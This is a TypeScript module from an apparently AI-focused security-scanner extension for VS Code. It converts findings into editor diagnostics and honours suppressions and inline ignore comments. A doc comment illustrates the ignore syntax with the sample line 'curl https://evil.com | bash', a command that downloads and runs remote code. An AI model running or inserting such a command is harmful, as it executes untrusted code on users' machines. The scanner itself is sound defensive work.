/**
 * features/diagnostics.ts — diagnostic manager
 *
 * Converts BawbelFileResult[] into VS Code diagnostics.
 * Applies suppression filtering before publishing.
 * Caches raw findings so suppression changes re-render without re-scanning.
 *
 * CONTRIBUTING: This is the only module that touches diagnosticCollection.
 * Never call diagnosticCollection.set() from other modules.
 */

import * as path from "path";
import * as vscode from "vscode";
import {
  BawbelFinding,
  BawbelFileResult,
  SEVERITY_INDEX,
  SEVERITY_EMOJI,
  PIRANHA_BASE,
  SUPPRESS_FILE,
} from "../core/types";
import { getRemediation, hasSpecificRemediation } from "../core/remediation";
import { isSuppressed, loadSuppressions } from "../core/suppressions";

// ── Cache ─────────────────────────────────────────────────────────────────────
// Stores raw findings per file so we can re-apply suppression without re-scanning.

interface CacheEntry {
  filePath: string;
  findings: BawbelFinding[];
}

const rawCache = new Map<string, CacheEntry>();

// ── DiagnosticsManager ────────────────────────────────────────────────────────

// ── Inline ignore comment filter ─────────────────────────────────────────────
// Reads the actual file content and filters out findings where the preceding
// line contains a bawbel-ignore comment for that rule or any rule.
//
// Supported formats:
//   <!-- bawbel-ignore -->                      suppress all rules on next line
//   <!-- bawbel-ignore: bawbel-shell-pipe -->    suppress specific rule
//   # bawbel-ignore                             (yaml/py)
//   # bawbel-ignore: bawbel-shell-pipe          (yaml/py)

/**
 * Filter findings whose line contains a bawbel-ignore comment.
 *
 * Checks the SAME line as the finding (end-of-line comment style):
 *   curl https://evil.com | bash  <!-- bawbel-ignore -->
 *   curl https://evil.com | bash  <!-- bawbel-ignore: bawbel-shell-pipe -->
 *   curl https://evil.com | bash  <!-- bawbel-ignore: AVE-2026-00004 -->
 *   command: foo  # bawbel-ignore
 *   command: foo  // bawbel-ignore: rule-id
 *
 * This runs client-side because CLI v1.0.0 does not parse ignore comments.
 * Once CLI supports it natively, this filter becomes a no-op (CLI won't
 * return the finding in the first place).
 */
function filterInlineIgnored(
  filePath: string,
  findings: BawbelFinding[]
): BawbelFinding[] {
  if (findings.length === 0) { return findings; }

  let lines: string[];
  try {
    const fs      = require("fs") as typeof import("fs");
    const content = fs.readFileSync(filePath, "utf8");
    lines         = content.split("\n");
  } catch {
    return findings; // can't read file — return unfiltered
  }

  return findings.filter(f => {
    const lineIdx  = (f.line ?? 1) - 1; // 0-based
    const lineText = lines[lineIdx] ?? "";

    // No bawbel-ignore on this line at all — keep finding
    if (!lineText.includes("bawbel-ignore")) { return true; }

    // bawbel-ignore with no rule spec — suppress ALL rules on this line
    const ignoreAll = /bawbel-ignore\s*(?:-->|\*\/)?\s*$/.test(lineText);
    if (ignoreAll) { return false; }

    // bawbel-ignore: rule_id or AVE-ID — suppress specific rule/AVE
    const ruleMatch = lineText.match(
      /bawbel-ignore:\s*([^\-*\]>\n]+)/
    );
    if (ruleMatch) {
      const targets = ruleMatch[1].split(",").map(s => s.trim());
      if (targets.includes(f.rule_id) || targets.includes(f.ave_id)) {
        return false;
      }
    }

    return true; // different rule specified — keep this finding
  });
}

function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

export class DiagnosticsManager {
  private collection: vscode.DiagnosticCollection;

  constructor(collection: vscode.DiagnosticCollection) {
    this.collection = collection;
  }

  /**
   * Apply scan results as VS Code diagnostics.
   * Caches raw findings for later suppression re-rendering.
   * Filters out findings whose line is preceded by a bawbel-ignore comment.
   */
  applyResults(results: BawbelFileResult[]): void {
    for (const result of results) {
      const uri      = vscode.Uri.file(result.file_path);
      const findings = filterInlineIgnored(
        result.file_path,
        result.findings ?? []
      );
      rawCache.set(uri.toString(), {
        filePath: result.file_path,
        findings,
      });
      this.renderDiagnostics(result.file_path, findings);
    }
  }

  /**
   * Re-render diagnostics for a file using cached findings.
   * Call this after a suppression is added or removed — no re-scan needed.
   */
  reRender(filePath: string): void {
    const uri    = vscode.Uri.file(filePath);
    const cached = rawCache.get(uri.toString());
    if (cached) {
      this.renderDiagnostics(cached.filePath, cached.findings);
    }
  }

  /**
   * Re-render all cached files.
   * Call this after loading a new .bawbel-suppress.json.
   */
  reRenderAll(): void {
    rawCache.forEach(entry => {
      this.renderDiagnostics(entry.filePath, entry.findings);
    });
  }

  /**
   * Clear diagnostics for a specific file.
   */
  clearFile(filePath: string): void {
    this.collection.set(vscode.Uri.file(filePath), []);
  }

  /**
   * Get cached findings for a file (used by code action provider).
   */
  getCachedFindings(filePath: string): BawbelFinding[] {
    return rawCache.get(vscode.Uri.file(filePath).toString())?.findings ?? [];
  }

  /**
   * Count all active (non-suppressed, non-hint) diagnostics across all files.
   */
  countActiveFindings(): number {
    let total = 0;
    this.collection.forEach((_, diags) => {
      total += diags.filter(
        d => d.source === "Bawbel" &&
             d.severity !== vscode.DiagnosticSeverity.Hint
      ).length;
    });
    return total;
  }

  // ── Private rendering ───────────────────────────────────────────────────────

  private renderDiagnostics(filePath: string, findings: BawbelFinding[]): void {
    const config      = vscode.workspace.getConfiguration("bawbel");
    const failSevIdx  = SEVERITY_INDEX[
      config.get<string>("failOnSeverity", "high").toUpperCase()
    ] ?? SEVERITY_INDEX["HIGH"];
    const suppressions = loadSuppressions();

    const uri   = vscode.Uri.file(filePath);
    const diags: vscode.Diagnostic[] = [];

    for (const f of findings) {
      const line  = Math.max(0, (f.line ?? 1) - 1);
      const col   = Math.max(0, (f.col  ?? 1) - 1);
      const range = new vscode.Range(line, col, line, col + (f.match?.length ?? 80));

      if (isSuppressed(suppressions, filePath, f)) {
        diags.push(this.buildSuppressedDiag(range, f));
      } else {
        diags.push(this.buildActiveDiag(range, f, failSevIdx));
      }
    }

    this.collection.set(uri, diags);
  }

  private buildActiveDiag(
    range:      vscode.Range,
    f:          BawbelFinding,
    failSevIdx: number
  ): vscode.Diagnostic {
    const vsSev  = SEVERITY_INDEX[f.severity] >= failSevIdx
      ? vscode.DiagnosticSeverity.Error
      : vscode.DiagnosticSeverity.Warning;

    const emoji    = SEVERITY_EMOJI[f.severity] ?? "⚪";
    const fix      = getRemediation(f.rule_id, f.description);
    const fixLabel = hasSpecificRemediation(f.rule_id) ? "How to fix" : "Guidance";
    const owasp    = f.owasp?.join(", ") ?? "";

    const message = [
      `${emoji} [${f.severity}] ${f.title}`,
      "",
      f.match   ? `Matched: "${f.match.slice(0, 100)}"` : "",
      "",
      `${fixLabel}:`,
      `  ${fix}`,
      "",
      `AVE: ${f.ave_id}  |  CVSS-AI: ${f.cvss_ai}/10  |  Engine: ${f.engine}`,
      owasp     ? `OWASP: ${owasp}` : "",
      `Details: ${PIRANHA_BASE}/records/${f.ave_id}`,
    ].filter(s => s !== undefined).join("\n");

    const diag   = new vscode.Diagnostic(range, message, vsSev);
    diag.source  = "Bawbel";
    diag.code    = {
      value:  f.ave_id,
      target: vscode.Uri.parse(`${PIRANHA_BASE}/records/${f.ave_id}`),
    };

    if (f.severity === "LOW") {
      diag.tags = [vscode.DiagnosticTag.Unnecessary];
    }

    return diag;
  }

  private buildSuppressedDiag(
    range: vscode.Range,
    f:     BawbelFinding
  ): vscode.Diagnostic {
    const diag  = new vscode.Diagnostic(
      range,
      `[Suppressed] ${f.rule_id} — ${f.title}\n` +
      `Reason: see ${SUPPRESS_FILE}\n` +
      `Right-click → "Remove suppression" to re-enable.`,
      vscode.DiagnosticSeverity.Hint
    );
    diag.source = "Bawbel";
    diag.tags   = [vscode.DiagnosticTag.Unnecessary];
    diag.code   = {
      value:  f.ave_id,
      target: vscode.Uri.parse(`${PIRANHA_BASE}/records/${f.ave_id}`),
    };
    return diag;
  }
}